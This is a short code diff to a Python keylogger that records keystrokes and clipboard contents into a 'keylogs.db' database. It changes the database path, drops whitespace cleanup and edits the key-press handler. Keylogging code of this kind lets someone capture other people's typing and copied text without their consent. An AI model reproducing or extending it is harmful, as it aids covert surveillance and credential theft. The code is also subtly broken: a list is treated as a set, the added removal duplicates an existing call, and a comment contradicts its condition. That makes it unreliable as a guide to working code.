@@ -7,7 +7,7 @@ from logData.logger import log_clipboard, log_sentence
 import re
 
 # Database setup
-DB_FILE = "keylogs.db"
+DB_FILE = "./db/keylogs.db"
 
 
 def create_database():
@@ -64,7 +64,6 @@ def log_buffer():
     global buffer
     if buffer:
         sentence = "".join(buffer)
-        sentence = re.sub(r"\s+", " ", sentence.replace("\n", " "))
         log_sentence(sentence)
         buffer = []
 
@@ -90,6 +89,7 @@ def on_press(key):
             if key in modifier_keys:  # Only add non-modifier keys to buffer
                 if buffer:
                     buffer.discard(str(key))
+                    buffer.remove(str(key))
                     log_buffer()
 
     except Exception as e:
